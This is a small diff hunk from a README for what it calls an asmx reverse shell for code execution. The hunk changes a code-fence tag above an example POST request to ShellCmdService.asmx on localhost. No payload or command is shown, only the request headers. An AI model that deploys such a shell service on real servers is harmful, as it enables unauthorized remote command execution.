@@ -12,7 +12,7 @@ This repository contains an asmx reverse shell for achieving code execution usin
 
    Example request:
 
-   ```http
+   ```bash
    POST /ShellCmdService.asmx HTTP/1.1
    Host: 127.0.0.1
    Content-Type: text/xml
